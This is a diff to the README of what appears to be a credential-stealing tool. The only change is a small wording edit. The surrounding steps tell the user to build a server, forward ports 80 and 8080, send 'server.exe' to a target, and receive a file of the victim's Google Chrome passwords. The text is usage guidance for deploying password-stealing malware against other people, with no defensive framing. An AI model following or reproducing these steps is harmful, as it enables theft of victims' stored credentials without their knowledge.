@@ -25,7 +25,7 @@ Install pyton 2.7
 
 	1. Create server by runing the python script "create_server.py". It will then ask you for your ip, you must type your PUBLIC ip (ex: 152.162.93.12). You can obtain your public ip by typing "WhatIsMyIp" on Google.
 	2. Setup Port forwading. You want to forward the port 80 and 8080 to your machine (look up how to do that if you don't know)
-	3. Start the client and suppli your LOCAL (never public) IP.
+	3. Start the client and stype your LOCAL (never public here) IP.
 	4. Send the server.exe to your target.
 	5. Obtain a password text file in the same location as the client with all the Google Chrome Passwords.
 
